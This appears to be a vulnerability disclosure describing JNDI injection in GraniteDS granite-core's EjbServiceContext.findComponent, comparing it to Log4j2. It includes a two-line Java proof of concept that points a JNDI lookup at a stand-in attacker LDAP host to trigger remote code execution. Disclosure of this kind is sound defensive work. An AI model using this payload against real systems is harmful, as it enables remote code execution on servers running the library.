# Malicious configuration would lead to code injection vulnerability in `org.graniteds:granite-core:3.0.0.M3`

**Affected Version**

The latest version 3.0.0.M3 and below.

**Affected Components**

`granite-server-ejb/src/main/java/org/granite/tide/ejb/EjbServiceContext.java` 

**Describe the Vulnerability**

There is a method, `org.granite.tide.ejb.EjbServiceContext.findComponent`, designed to find component. However, passing an unchecked argument to this API can lead to the execution of arbitrary commands. For instance, following codes can lead to the execution of arbitrary commands from remote attackers:

```java
        EjbServiceContext context = new EjbServiceContext("ldap://example.com/Evil", new InitialContext());
        context.findComponent("deadbeef", null);
```

**Root Cause and Potential Danger**

The API is given more power than it should have, namely to just `lookup` without checking it. It violates the principle of least privilege. In this case, developers are not aware that the API used to find component could execute arbitrary commands, leading to insufficient parameter validation and command execution. 

We believe that this kind of implementation obscures the responsibility of security checks between the developers and the users of libraries, which has been confirmed by some developers. This issue is similar to the previously well-known Log4j2 vulnerability, where few developers knew that logging APIs could result in JNDI injection.

**To Reproduce**

Just execute above codes will reproduce it.
